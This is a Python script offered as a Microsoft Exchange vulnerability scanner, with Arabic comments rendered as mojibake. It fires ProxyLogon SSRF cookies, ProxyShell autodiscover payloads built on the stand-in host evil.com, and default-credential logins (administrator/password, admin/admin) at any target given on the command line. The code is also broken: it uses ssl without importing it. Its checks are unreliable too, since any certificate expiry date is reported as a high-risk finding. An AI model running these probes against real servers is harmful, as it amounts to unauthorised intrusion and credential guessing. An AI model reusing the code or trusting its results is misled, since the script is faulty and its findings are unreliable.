#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ø£Ø¯Ø§Ø© ÙØ­Øµ Ù…ØªØ®ØµØµØ© Ù„Ø«ØºØ±Ø§Øª Microsoft Exchange Server
Microsoft Exchange Vulnerability Scanner
"""

import requests
import socket
import json
import argparse
from datetime import datetime
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ExchangeVulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []

    def banner(self):
        banner = """
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘              Microsoft Exchange Vulnerability Scanner        â•‘
    â•‘               ÙØ­Øµ Ù…ØªØ®ØµØµ Ù„Ø«ØºØ±Ø§Øª Microsoft Exchange          â•‘
    â•‘                                                              â•‘
    â•‘  ProxyLogon â€¢ ProxyShell â€¢ OWA â€¢ ActiveSync â€¢ Autodiscover  â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """
        print(banner)

    def scan_proxylogon(self, target):
        """ÙØ­Øµ Ø«ØºØ±Ø© ProxyLogon (CVE-2021-26855)"""
        print("ğŸ” ÙØ­Øµ Ø«ØºØ±Ø© ProxyLogon...")
        
        # Ø§Ø®ØªØ¨Ø§Ø± SSRF Ø¹Ø¨Ø± Ø±Ø£Ø³ X-BEResource
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Cookie': 'X-BEResource=localhost/owa/auth/logon.aspx?&~1;',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        vulnerable_endpoints = [
            '/owa/auth/x.js',
            '/ecp/default.flt',
            '/ecp/pentest.js',
            '/owa/auth/logon.aspx'
        ]
        
        for endpoint in vulnerable_endpoints:
            try:
                url = f"https://{target}{endpoint}"
                response = self.session.get(url, headers=headers, timeout=15, verify=False)
                
                # Ø¹Ù„Ø§Ù…Ø§Øª Ø§Ù„Ø¥ØµØ§Ø¨Ø© Ø¨Ø«ØºØ±Ø© ProxyLogon
                if response.status_code == 200 and 'X-FEServer' in response.headers:
                    self.vulnerabilities.append({
                        'vulnerability': 'ProxyLogon',
                        'cve': 'CVE-2021-26855',
                        'target': target,
                        'url': url,
                        'risk_level': 'CRITICAL',
                        'description': 'Ø«ØºØ±Ø© ProxyLogon Ù…Ø­ØªÙ…Ù„Ø© - SSRF Ø¹Ø¨Ø± X-BEResource',
                        'details': {
                            'endpoint': endpoint,
                            'response_headers': dict(response.headers)
                        }
                    })
                    return True
                    
            except Exception as e:
                continue
        
        return False

    def scan_proxyshell(self, target):
        """ÙØ­Øµ Ø«ØºØ±Ø© ProxyShell (CVE-2021-34473, CVE-2021-34523)"""
        print("ğŸ” ÙØ­Øµ Ø«ØºØ±Ø© ProxyShell...")
        
        # Ø§Ø®ØªØ¨Ø§Ø± RCE Ø¹Ø¨Ø± Autodiscover
        autodiscover_payloads = [
            f"https://{target}/autodiscover/autodiscover.json?@evil.com/owa/?&Email=autodiscover/autodiscover.json%3f@evil.com",
            f"https://{target}/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@evil.com",
            f"https://{target}/autodiscover/autodiscover.json?@evil.com/PowerShell/?&Email=autodiscover/autodiscover.json%3f@evil.com"
        ]
        
        for payload in autodiscover_payloads:
            try:
                response = self.session.get(payload, timeout=15, verify=False)
                
                # Ø¹Ù„Ø§Ù…Ø§Øª Ø§Ù„Ø¥ØµØ§Ø¨Ø©
                if response.status_code == 200 and 'X-CalculatedBETarget' in response.headers:
                    self.vulnerabilities.append({
                        'vulnerability': 'ProxyShell',
                        'cve': 'CVE-2021-34473',
                        'target': target,
                        'url': payload,
                        'risk_level': 'CRITICAL',
                        'description': 'Ø«ØºØ±Ø© ProxyShell Ù…Ø­ØªÙ…Ù„Ø© - RCE Ø¹Ø¨Ø± Autodiscover',
                        'details': {
                            'payload': payload,
                            'response_headers': dict(response.headers)
                        }
                    })
                    return True
                    
            except Exception as e:
                continue
        
        return False

    def scan_owa_endpoints(self, target):
        """ÙØ­Øµ Ù†Ù‚Ø§Ø· Ù†Ù‡Ø§ÙŠØ© OWA Ø§Ù„Ù…Ø¹Ø±Ø¶Ø©"""
        print("ğŸ” ÙØ­Øµ OWA endpoints...")
        
        owa_endpoints = [
            '/owa/auth/logon.aspx',
            '/owa/auth.owa',
            '/ecp/default.aspx',
            '/ecp/',
            '/owa/',
            '/Microsoft-Server-ActiveSync',
            '/EWS/Exchange.asmx',
            '/Autodiscover/Autodiscover.xml',
            '/Rpc/'
        ]
        
        exposed_endpoints = []
        
        for endpoint in owa_endpoints:
            try:
                url = f"https://{target}{endpoint}"
                response = self.session.get(url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    # ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Exchange
                    exchange_indicators = [
                        'Outlook Web App',
                        'Exchange',
                        'owaLgnBdy',
                        'logonPage',
                        'X-OWA-Version'
                    ]
                    
                    page_content = response.text.lower()
                    if any(indicator.lower() in page_content for indicator in exchange_indicators):
                        exposed_endpoints.append({
                            'endpoint': endpoint,
                            'url': url,
                            'status': 'exposed',
                            'response_size': len(response.content)
                        })
                        
                        self.vulnerabilities.append({
                            'vulnerability': 'OWA Endpoint Exposed',
                            'target': target,
                            'url': url,
                            'risk_level': 'HIGH',
                            'description': f'Ù†Ù‚Ø·Ø© Ù†Ù‡Ø§ÙŠØ© OWA Ù…ÙƒØ´ÙˆÙØ©: {endpoint}',
                            'details': {
                                'endpoint': endpoint,
                                'response_size': len(response.content)
                            }
                        })
                        
            except Exception as e:
                continue
        
        return exposed_endpoints

    def scan_version_disclosure(self, target):
        """ÙØ­Øµ ÙƒØ´Ù Ø¥ØµØ¯Ø§Ø± Exchange Server"""
        print("ğŸ” ÙØ­Øµ ÙƒØ´Ù Ø§Ù„Ø¥ØµØ¯Ø§Ø±...")
        
        version_indicators = [
            '/owa/auth/logon.aspx',
            '/ecp/default.aspx',
            '/owa/',
            '/ecp/'
        ]
        
        for path in version_indicators:
            try:
                url = f"https://{target}{path}"
                response = self.session.get(url, timeout=10, verify=False)
                
                # Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¥ØµØ¯Ø§Ø±
                version_patterns = [
                    r'Exchange/(\d+\.\d+\.\d+\.\d+)',
                    r'X-OWA-Version: (\d+\.\d+\.\d+\.\d+)',
                    r'owa/auth/(\d+\.\d+\.\d+\.\d+)',
                    r'Exchange Server (\d{4})'
                ]
                
                for pattern in version_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    if matches:
                        version = matches[0]
                        self.vulnerabilities.append({
                            'vulnerability': 'Version Disclosure',
                            'target': target,
                            'url': url,
                            'risk_level': 'MEDIUM',
                            'description': f'ÙƒØ´Ù Ø¥ØµØ¯Ø§Ø± Exchange Server: {version}',
                            'details': {
                                'version': version,
                                'endpoint': path
                            }
                        })
                        break
                        
            except Exception as e:
                continue

    def scan_ssl_configuration(self, target):
        """ÙØ­Øµ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª SSL/TLS Ù„Ù€ Exchange"""
        print("ğŸ” ÙØ­Øµ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª SSL...")
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((target, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert()
                    
                    # ÙØ­Øµ ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ø´Ù‡Ø§Ø¯Ø©
                    not_after = cert.get('notAfter')
                    if not_after:
                        self.vulnerabilities.append({
                            'vulnerability': 'SSL Certificate Expiry',
                            'target': target,
                            'risk_level': 'HIGH',
                            'description': f'Ø´Ù‡Ø§Ø¯Ø© SSL ØªÙ†ØªÙ‡ÙŠ ÙÙŠ: {not_after}',
                            'details': {
                                'expiry_date': not_after,
                                'issuer': cert.get('issuer', [])
                            }
                        })
                        
        except Exception as e:
            self.vulnerabilities.append({
                'vulnerability': 'SSL Configuration',
                'target': target,
                'risk_level': 'HIGH',
                'description': f'Ù…Ø´ÙƒÙ„Ø© ÙÙŠ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª SSL: {str(e)}',
                'details': {
                    'error': str(e)
                }
            })

    def scan_authentication_bypass(self, target):
        """ÙØ­Øµ ØªØ¬Ø§ÙˆØ² Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©"""
        print("ğŸ” ÙØ­Øµ ØªØ¬Ø§ÙˆØ² Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©...")
        
        bypass_payloads = [
            {'path': '/owa/auth/logon.aspx', 'payload': {'username': 'administrator', 'password': 'password'}},
            {'path': '/ecp/default.aspx', 'payload': {'username': 'administrator', 'password': 'password'}},
            {'path': '/owa/auth.owa', 'payload': {'destination': 'https://localhost/owa', 'username': 'admin', 'password': 'admin'}}
        ]
        
        for bypass in bypass_payloads:
            try:
                url = f"https://{target}{bypass['path']}"
                response = self.session.post(url, data=bypass['payload'], timeout=15, verify=False)
                
                # Ø¹Ù„Ø§Ù…Ø§Øª ØªØ¬Ø§ÙˆØ² Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©
                if response.status_code == 302 and 'sessionid' in str(response.cookies).lower():
                    self.vulnerabilities.append({
                        'vulnerability': 'Authentication Bypass',
                        'target': target,
                        'url': url,
                        'risk_level': 'CRITICAL',
                        'description': 'ØªØ¬Ø§ÙˆØ² Ù…ØµØ§Ø¯Ù‚Ø© Ù…Ø­ØªÙ…Ù„ ÙÙŠ Exchange',
                        'details': {
                            'endpoint': bypass['path'],
                            'payload': bypass['payload']
                        }
                    })
                    
            except Exception as e:
                continue

    def scan_active_sync(self, target):
        """ÙØ­Øµ ActiveSync API"""
        print("ğŸ” ÙØ­Øµ ActiveSync API...")
        
        activesync_url = f"https://{target}/Microsoft-Server-ActiveSync"
        
        try:
            response = self.session.get(activesync_url, timeout=10, verify=False)
            
            if response.status_code == 401 or response.status_code == 403:
                self.vulnerabilities.append({
                    'vulnerability': 'ActiveSync Exposed',
                    'target': target,
                    'url': activesync_url,
                    'risk_level': 'MEDIUM',
                    'description': 'Ø®Ø¯Ù…Ø© ActiveSync Ù…ÙƒØ´ÙˆÙØ© ÙˆØªØ­ØªØ§Ø¬ Ù…ØµØ§Ø¯Ù‚Ø©',
                    'details': {
                        'status_code': response.status_code,
                        'headers': dict(response.headers)
                    }
                })
            elif response.status_code == 200:
                self.vulnerabilities.append({
                    'vulnerability': 'ActiveSync Unprotected',
                    'target': target,
                    'url': activesync_url,
                    'risk_level': 'HIGH',
                    'description': 'Ø®Ø¯Ù…Ø© ActiveSync Ù…ØªØ§Ø­Ø© Ø¨Ø¯ÙˆÙ† Ù…ØµØ§Ø¯Ù‚Ø©',
                    'details': {
                        'status_code': response.status_code
                    }
                })
                
        except Exception as e:
            pass

    def generate_report(self, target):
        """Ø¥Ù†Ø´Ø§Ø¡ ØªÙ‚Ø±ÙŠØ± Ø´Ø§Ù…Ù„"""
        print("\nğŸ“Š ØªÙ‚Ø±ÙŠØ± ÙØ­Øµ Microsoft Exchange")
        print("=" * 60)
        
        if not self.vulnerabilities:
            print("âœ… Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø«ØºØ±Ø§Øª ÙÙŠ Microsoft Exchange")
            return
        
        # ØªØ¬Ù…ÙŠØ¹ Ø­Ø³Ø¨ Ø§Ù„Ù…Ø®Ø§Ø·Ø±
        critical = [v for v in self.vulnerabilities if v['risk_level'] == 'CRITICAL']
        high = [v for v in self.vulnerabilities if v['risk_level'] == 'HIGH']
        medium = [v for v in self.vulnerabilities if v['risk_level'] == 'MEDIUM']
        
        print(f"ğŸš¨ Ø«ØºØ±Ø§Øª Ø­Ø±Ø¬Ø©: {len(critical)}")
        print(f"ğŸ”´ Ø«ØºØ±Ø§Øª Ø¹Ø§Ù„ÙŠØ©: {len(high)}")
        print(f"âš ï¸  Ø«ØºØ±Ø§Øª Ù…ØªÙˆØ³Ø·Ø©: {len(medium)}")
        print()
        
        # Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„
        for vuln in self.vulnerabilities:
            print(f"[{vuln['risk_level']}] {vuln['vulnerability']}: {vuln['description']}")
            if 'cve' in vuln:
                print(f"    CVE: {vuln['cve']}")
            if 'url' in vuln:
                print(f"    URL: {vuln['url']}")
            print()
        
        # Ø­ÙØ¸ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
        report = {
            'target': target,
            'scan_date': datetime.now().isoformat(),
            'scan_type': 'Microsoft Exchange Vulnerability Scan',
            'total_vulnerabilities': len(self.vulnerabilities),
            'critical': len(critical),
            'high': len(high),
            'medium': len(medium),
            'vulnerabilities': self.vulnerabilities
        }
        
        filename = f"exchange_vulnerabilities_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
        
        print(f"ğŸ’¾ ØªÙ… Ø­ÙØ¸ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ ÙÙŠ: {filename}")

    def run_exchange_scan(self, target):
        """ØªØ´ØºÙŠÙ„ ÙØ­Øµ Ø´Ø§Ù…Ù„ Ù„Ù€ Exchange"""
        self.banner()
        
        print(f"ğŸ¯ Ø¨Ø¯Ø¡ ÙØ­Øµ Microsoft Exchange: {target}")
        print("=" * 60)
        
        # ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø¹Ù…Ù„ÙŠØ§Øª Ø§Ù„ÙØ­Øµ
        scanners = [
            self.scan_proxylogon,
            self.scan_proxyshell,
            self.scan_owa_endpoints,
            self.scan_version_disclosure,
            self.scan_ssl_configuration,
            self.scan_authentication_bypass,
            self.scan_active_sync
        ]
        
        for scanner in scanners:
            try:
                scanner(target)
            except Exception as e:
                print(f"âš ï¸ Ø®Ø·Ø£ ÙÙŠ {scanner.__name__}: {str(e)}")
        
        self.generate_report(target)
        return self.vulnerabilities

def main():
    parser = argparse.ArgumentParser(description='Ø£Ø¯Ø§Ø© ÙØ­Øµ Ù…ØªØ®ØµØµØ© Ù„Ø«ØºØ±Ø§Øª Microsoft Exchange Server')
    parser.add_argument('-t', '--target', required=True, help='Ø§Ù„Ù‡Ø¯Ù Ù„Ù„ÙØ­Øµ (Ù†Ø·Ø§Ù‚ Ø£Ùˆ IP)')
    parser.add_argument('-o', '--output', help='Ù…Ù„Ù Ø§Ù„Ø¥Ø®Ø±Ø§Ø¬ JSON')
    
    args = parser.parse_args()
    
    scanner = ExchangeVulnerabilityScanner()
    vulnerabilities = scanner.run_exchange_scan(args.target)

if __name__ == "__main__":
    main()